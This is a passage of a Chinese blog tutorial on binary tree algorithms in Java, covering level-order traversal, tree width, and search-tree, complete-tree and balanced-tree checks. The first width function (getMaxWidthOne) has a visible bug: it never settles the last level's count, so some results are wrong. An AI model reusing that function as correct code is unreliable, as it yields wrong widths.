punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>cur<span class="token punctuation">.</span>value<span class="token operator">+</span><span class="token string">" "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>cur<span class="token punctuation">.</span>left <span class="token operator">!=</span> <span class="token keyword">null</span><span class="token punctuation">)</span> queue<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span>cur<span class="token punctuation">.</span>left<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>cur<span class="token punctuation">.</span>right <span class="token operator">!=</span> <span class="token keyword">null</span><span class="token punctuation">)</span> queue<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span>cur<span class="token punctuation">.</span>right<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="0x01-求二叉树的宽度"><a href="#0x01-求二叉树的宽度" class="headerlink" title="0x01 求二叉树的宽度"></a>0x01 求二叉树的宽度</h3><h4 id="1-0-3"><a href="#1-0-3" class="headerlink" title="1.0"></a>1.0</h4><p>采用哈希表，存储每一个节点对应在第几层，从根节点在第一层开始，按照宽度优先遍历的步骤，使用变量存储当前在第几层、当前层数已经遍历的节点数量、当前已知的最大宽度(max)</p><p>从第一层开始，将根节点入队，出队发现当前在第一层，出队的节点查表得知在第一层，所以开始累积第一层已经遍历的节点数量，为1，跟随宽度优先遍历，入队的同时，也将节点的宽度入表</p><p>到了第二层，查表发现出队的节点的层数与当前层数不一致，当前层数的节点遍历完毕，可以结算节点的数量，与max比较即可，当前的层数来到第二层，当前层数已经遍历的节点数量也刷新（这里注意，因为现在到了第二层，遍历完了第一个节点，所以刷新值为1而不是0），循环下去即可</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">int</span> <span class="token function">getMaxWidthOne</span><span class="token punctuation">(</span><span class="token class-name">Node</span> head<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>head <span class="token operator">!=</span> <span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token class-name">Queue</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Node</span><span class="token punctuation">></span></span> queue <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">LinkedList</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token punctuation">></span></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">HashMap</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Node</span><span class="token punctuation">,</span> <span class="token class-name">Integer</span><span class="token punctuation">></span></span> hm <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">HashMap</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token punctuation">></span></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        queue<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span>head<span class="token punctuation">)</span><span class="token punctuation">;</span>        hm<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span>head<span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">int</span> curLevel <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>        <span class="token keyword">int</span> curLevelNodes <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>        <span class="token keyword">int</span> max <span class="token operator">=</span> <span class="token class-name">Integer</span><span class="token punctuation">.</span>MIN_VALUE<span class="token punctuation">;</span>        <span class="token keyword">while</span><span class="token punctuation">(</span><span class="token operator">!</span>queue<span class="token punctuation">.</span><span class="token function">isEmpty</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token class-name">Node</span> cur <span class="token operator">=</span> queue<span class="token punctuation">.</span><span class="token function">poll</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">int</span> curNodeLevel <span class="token operator">=</span> hm<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>cur<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">if</span><span class="token punctuation">(</span>curNodeLevel <span class="token operator">==</span> curLevel<span class="token punctuation">)</span> curLevelNodes<span class="token operator">++</span><span class="token punctuation">;</span>            <span class="token keyword">else</span><span class="token punctuation">&#123;</span>                max <span class="token operator">=</span> <span class="token class-name">Math</span><span class="token punctuation">.</span><span class="token function">max</span><span class="token punctuation">(</span>max<span class="token punctuation">,</span> curLevelNodes<span class="token punctuation">)</span><span class="token punctuation">;</span>                curLevel<span class="token operator">++</span><span class="token punctuation">;</span>                curLevelNodes <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>cur<span class="token punctuation">.</span>left <span class="token operator">!=</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                hm<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span>cur<span class="token punctuation">.</span>left<span class="token punctuation">,</span> curNodeLevel<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                queue<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span>cur<span class="token punctuation">.</span>left<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>cur<span class="token punctuation">.</span>right <span class="token operator">!=</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                hm<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span>cur<span class="token punctuation">.</span>right<span class="token punctuation">,</span> curNodeLevel<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                queue<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span>cur<span class="token punctuation">.</span>right<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">return</span> max<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="2-0-3"><a href="#2-0-3" class="headerlink" title="2.0"></a>2.0</h4><p>不使用哈希表，只使用队列，额外变量记录当前层的最后一个节点、下一层的最后一个节点、当前层的节点数量、当前已知的最大宽度(max)</p><p>根节点入队，出队，当前层的最后一个节点赋为根节点，下一层的最后一个节点赋为空，然后开始左右节点入队，保持下一层的最后一个节点总是为最后入队的节点（即队尾的节点），当到达当前层的最后一个节点时，结算，进行下一轮</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">int</span> <span class="token function">getMaxWidthTwo</span><span class="token punctuation">(</span><span class="token class-name">Node</span> head<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>head <span class="token operator">!=</span> <span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token class-name">Queue</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Node</span><span class="token punctuation">></span></span> queue <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">LinkedList</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token punctuation">></span></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        queue<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span>head<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">int</span> max <span class="token operator">=</span> <span class="token class-name">Integer</span><span class="token punctuation">.</span>MIN_VALUE<span class="token punctuation">;</span>        <span class="token keyword">int</span> curLevelNodes <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>        <span class="token class-name">Node</span> curEnd <span class="token operator">=</span> queue<span class="token punctuation">.</span><span class="token function">peek</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">Node</span> nextEnd <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span>        <span class="token keyword">while</span><span class="token punctuation">(</span><span class="token operator">!</span>queue<span class="token punctuation">.</span><span class="token function">isEmpty</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token class-name">Node</span> cur <span class="token operator">=</span> queue<span class="token punctuation">.</span><span class="token function">poll</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>cur<span class="token punctuation">.</span>left <span class="token operator">!=</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                queue<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span>cur<span class="token punctuation">.</span>left<span class="token punctuation">)</span><span class="token punctuation">;</span>                nextEnd <span class="token operator">=</span> cur<span class="token punctuation">.</span>left<span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>cur<span class="token punctuation">.</span>right <span class="token operator">!=</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                queue<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span>cur<span class="token punctuation">.</span>right<span class="token punctuation">)</span><span class="token punctuation">;</span>                nextEnd <span class="token operator">=</span> cur<span class="token punctuation">.</span>right<span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>            <span class="token keyword">if</span><span class="token punctuation">(</span>cur <span class="token operator">==</span> curEnd<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>                curEnd <span class="token operator">=</span> nextEnd<span class="token punctuation">;</span>                nextEnd <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span>                max <span class="token operator">=</span> <span class="token class-name">Math</span><span class="token punctuation">.</span><span class="token function">max</span><span class="token punctuation">(</span>max<span class="token punctuation">,</span> curLevelNodes<span class="token punctuation">)</span><span class="token punctuation">;</span>                curLevelNodes <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>                curLevelNodes<span class="token operator">++</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">return</span> max<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="0x02-判断搜索二叉树"><a href="#0x02-判断搜索二叉树" class="headerlink" title="0x02 判断搜索二叉树"></a>0x02 判断搜索二叉树</h3><p>搜索二叉树即左子树的值都比根节点小，右子树的值都比根节点大，一棵经典的搜索二叉树是没有重复值的</p><p>使用中序遍历即可，中序遍历搜索二叉树即为升序，所以如果一旦遇到逆序的，则不是搜索二叉树，需要在中序遍历的打印处修改为判断结构即可</p><h4 id="1-0-递归的改写"><a href="#1-0-递归的改写" class="headerlink" title="1.0 递归的改写"></a>1.0 递归的改写</h4><p>需要一个全局变量记录遍历到的前一个值，然后与遍历的值比较即可</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">int</span> pre <span class="token operator">=</span> <span class="token class-name">Integer</span><span class="token punctuation">.</span>MIN_VALUE<span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">boolean</span> <span class="token function">isBSTOne</span><span class="token punctuation">(</span><span class="token class-name">Node</span> head<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>head <span class="token operator">==</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span>    <span class="token keyword">boolean</span> isBST <span class="token operator">=</span> <span class="token function">isBSTOne</span><span class="token punctuation">(</span>head<span class="token punctuation">.</span>left<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span>isBST<span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>head<span class="token punctuation">.</span>value <span class="token operator">&lt;=</span> pre<span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>    pre <span class="token operator">=</span> head<span class="token punctuation">.</span>value<span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token function">isBSTOne</span><span class="token punctuation">(</span>head<span class="token punctuation">.</span>right<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="2-0-迭代的改写"><a href="#2-0-迭代的改写" class="headerlink" title="2.0 迭代的改写"></a>2.0 迭代的改写</h4><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">boolean</span> <span class="token function">isBSTTwo</span><span class="token punctuation">(</span><span class="token class-name">Node</span> head<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>head <span class="token operator">!=</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">Stack</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Node</span><span class="token punctuation">></span></span> stack <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Stack</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token punctuation">></span></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">int</span> pre <span class="token operator">=</span> <span class="token class-name">Integer</span><span class="token punctuation">.</span>MIN_VALUE<span class="token punctuation">;</span>        <span class="token keyword">while</span><span class="token punctuation">(</span><span class="token operator">!</span>stack<span class="token punctuation">.</span><span class="token function">isEmpty</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">||</span> head <span class="token operator">!=</span> <span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token keyword">if</span><span class="token punctuation">(</span>head <span class="token operator">!=</span> <span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>                stack<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span>head<span class="token punctuation">)</span><span class="token punctuation">;</span>                head <span class="token operator">=</span> head<span class="token punctuation">.</span>left<span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>                head <span class="token operator">=</span> stack<span class="token punctuation">.</span><span class="token function">pop</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token keyword">if</span><span class="token punctuation">(</span>head<span class="token punctuation">.</span>value <span class="token operator">&lt;=</span> pre<span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>                <span class="token keyword">else</span> pre <span class="token operator">=</span> head<span class="token punctuation">.</span>value<span class="token punctuation">;</span>                head <span class="token operator">=</span> head<span class="token punctuation">.</span>right<span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="0x03-判断完全二叉树"><a href="#0x03-判断完全二叉树" class="headerlink" title="0x03 判断完全二叉树"></a>0x03 判断完全二叉树</h3><p>即要么所有层都是满的，要么最后一层即使不满也是从左到右依次占满</p><p>显然可以使用宽度遍历，遍历过程中进入如下判断</p><p>1）如果有右无左，false</p><p>2）过了1，说明不会存在有右无左，则现在如果出现有一个子节点为null，则后面的节点必须都为null，否则false，如何判断后面的节点，需要设立一个布尔变量标志是否遇到左右两个子节点不双全的情况</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">boolean</span> <span class="token function">isCBT</span><span class="token punctuation">(</span><span class="token class-name">Node</span> head<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>head <span class="token operator">!=</span> <span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token class-name">Queue</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Node</span><span class="token punctuation">></span></span> queue <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">LinkedList</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token punctuation">></span></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        queue<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span>head<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">boolean</span> leaf <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">;</span>        <span class="token keyword">while</span><span class="token punctuation">(</span><span class="token operator">!</span>queue<span class="token punctuation">.</span><span class="token function">isEmpty</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token class-name">Node</span> cur <span class="token operator">=</span> queue<span class="token punctuation">.</span><span class="token function">poll</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token class-name">Node</span> l <span class="token operator">=</span> cur<span class="token punctuation">.</span>left<span class="token punctuation">;</span>            <span class="token class-name">Node</span> r <span class="token operator">=</span> cur<span class="token punctuation">.</span>right<span class="token punctuation">;</span>            <span class="token keyword">if</span><span class="token punctuation">(</span>                    <span class="token punctuation">(</span>leaf <span class="token operator">&amp;&amp;</span><span class="token punctuation">(</span>l<span class="token operator">!=</span><span class="token keyword">null</span> <span class="token operator">||</span> r<span class="token operator">!=</span><span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token punctuation">(</span>l <span class="token operator">==</span> <span class="token keyword">null</span> <span class="token operator">&amp;&amp;</span> r <span class="token operator">!=</span> <span class="token keyword">null</span><span class="token punctuation">)</span>            <span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>            <span class="token keyword">if</span><span class="token punctuation">(</span>l <span class="token operator">==</span> <span class="token keyword">null</span> <span class="token operator">||</span> r <span class="token operator">==</span> <span class="token keyword">null</span><span class="token punctuation">)</span> leaf <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>l <span class="token operator">!=</span> <span class="token keyword">null</span><span class="token punctuation">)</span> queue<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span>l<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>r <span class="token operator">!=</span> <span class="token keyword">null</span><span class="token punctuation">)</span> queue<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span>r<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="0x04-二叉树的递归套路（树型DP）"><a href="#0x04-二叉树的递归套路（树型DP）" class="headerlink" title="0x04 二叉树的递归套路（树型DP）"></a>0x04 二叉树的递归套路（树型DP）</h3><p>左树提供什么信息，右树提供什么信息，然后怎么整合返回给上一层的递归</p><p>使用前提： 如果题目求解目标是S规则，则求解流程可以定成以每一个节点为头节点的子树在S规则下的每一个答案，并且最终答案一定在其中</p><blockquote><p>树形dp套路</p><p>1）以某个节点X为头节点的子树中，分析答案有哪些可能性，并且这种分析是以X的左子树、X的右子树和X整棵树的角度来考虑可能性的</p><p>2）根据第一步的可能性分析，列出所有需要的信息</p><p>3）合并第二步的信息，对左树和右树提出同样的要求，并写出需要返回的信息结构</p><p>4）设计递归函数，递归函数是处理以X为头节点的情况下的答案。 包括设计递归的basecase，默认直接得到左树和右树的所有信息，以及把可能性做整合，并且要返回第三步的信息结构这四个小步骤</p></blockquote><h4 id="判断平衡二叉树"><a href="#判断平衡二叉树" class="headerlink" title="判断平衡二叉树"></a>判断平衡二叉树</h4><p>指左子树与右子树高度之差不超过1</p><p>递归过程中，需要左子树和右子树提供的信息为1）是否为平衡二叉树，2）该子树的高度</p><p>那么整棵子树也需要给上一层递归提供同样的上述两个信息，书写递归即可</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">class</span> returnType<span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token keyword">boolean</span> isBalanced<span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">int</span> height<span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token function">returnType</span><span class="token punctuation">(</span><span class="token keyword">boolean</span> isBalanced<span class="token punctuation">,</span> <span class="token keyword">int</span> height<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>isBalanced <span class="token operator">=</span> isBalanced<span class="token punctuation">;</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>height <span class="token operator">=</span> height<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">boolean</span> <span class="token function">isBalancedTree</span><span class="token punctuation">(</span><span class="token class-name">Node</span> head<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">return</span> <span class="token function">process</span><span class="token punctuation">(</span>head<span class="token punctuation">)</span><span class="token punctuation">.</span>isBalanced<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">public</span> <span class="token keyword">static</span> returnType <span class="token function">process</span><span class="token punctuation">(</span><span class="token class-name">Node</span> head<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>head <span class="token operator">==</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token keyword">new</span> <span class="token function">returnType</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    returnType lreturn <span class="token operator">=</span> <span class="token function">process</span><span class="token punctuation">(</span>head<span class="token punctuation">.</span>left<span class="token punctuation">)</span><span class="token punctuation">;</span>    returnType rreturn <span class="token operator">=</span> <span class="token function">process</span><span class="token punctuation">(</span>head<span class="token punctuation">.</span>right<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">boolean</span> isBalanced <span class="token operator">=</span> <span class="token punctuation">(</span>lreturn<span class="token punctuation">.</span>isBalanced<span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span>rreturn<span class="token punctuation">.</span>isBalanced<span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span><span class="token class-name">Math</span><span class="token punctuation">.</span><span class="token function">abs</span><span class="token punctuation">(</span><span class="token punctuation">(</span>lreturn<span class="token punctuation">.</span>height<span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token punctuation">(</span>rreturn<span class="token punctuation">.</span>height<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">&lt;=</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">int</span> height <span class="token operator">=</span> <span class="token class-name">Math</span><span class="token punctuation">.</span><span class="token function">max</span><span class="token punctuation">(</span>lreturn<span class="token punctuation">.</span>height<span class="token punctuation">,</span> rreturn<span class="token punctuation">.</span>height<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token keyword">new</span> <span class="token function">returnType</span><span class="token punctuation">(</span>isBalanced<span class="token punctuation">,</span> height<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="判断搜索二叉树"><a href="#判断搜索二叉树" class="headerlink" title="判断搜索二叉树"></a>判断搜索二叉树</h4><p>这里需要左子树提供1）是否为搜索二叉树，2）该树最大值（需要小于根节点），右子树提供1）是否为搜索二叉树，2）该树最小值（需要大于根节点）</p><p>然而，我们需要递归返回同样的信息，现在出现一个需要最大值，一个需要最小值，所以我们选择将两者都返回</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">class</span> returnData<span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token keyword">boolean</span> isBST<span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">int</span> max<span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">int</span> min<span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token function">returnData</span><span class="token punctuation">(</span><span class="token keyword">boolean</span> isBST<span class="token punctuation">,</span> <span class="token keyword">int</span> max<span class="token punctuation">,</span> <span class="token keyword">int</span> min<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>isBST <span class="token operator">=</span> isBST<span class="token punctuation">;</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>max <span class="token operator">=</span> max<span class="token punctuation">;</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>min <span class="token operator">=</span> min<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">boolean</span> <span class="token function">isBST</span><span class="token punctuation">(</span><span class="token class-name">Node</span> head<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">return</span> <span class="token function">process</span><span class="token punctuation">(</span>head<span class="token punctuation">)</span><span class="token punctuation">.</span>isBST<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">public</span> <span class="token keyword">static</span> returnData <span class="token function">process</span><span class="token punctuation">(</span><span class="token class-name">Node</span> head<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>head <span class="token operator">==</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token keyword">null</span><span class="token punctuation">;</span>    returnData lData <span class="token operator">=</span> <span class="token function">process</span><span class="token punctuation">(</span>head<span class="token punctuation">.</span>left<span class="token punctuation">)</span><span class="token punctuation">;</span>    returnData rData <span class="token operator">=</span> <span class="token function">process</span><span class="token punctuation">(</span>head<span class="token punctuation">.</span>right<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">int</span> min <span class="token operator">=</span> head<span class="token punctuation">.</span>value<span class="token punctuation">;</span>    <span class="token keyword">int</span> max <span class="token operator">=</span> head<span class="token punctuation">.</span>value<span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>lData <span class="token operator">!=</span> <span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        min <span class="token operator">=</span> <span class="token class-name">Math</span><span class="token punctuation">.</span><span class="token function">min</span><span class="token punctuation">(</span>lData<span class="token punctuation">.</span>min<span class="token punctuation">,</span> min<span class="token punctuation">)</span><span class="token punctuation">;</span>        max <span class="token operator">=</span> <span class="token class-name">Math</span><span class="token punctuation">.</span><span class="token function">max</span><span class="token punctuation">(</span>lData<span 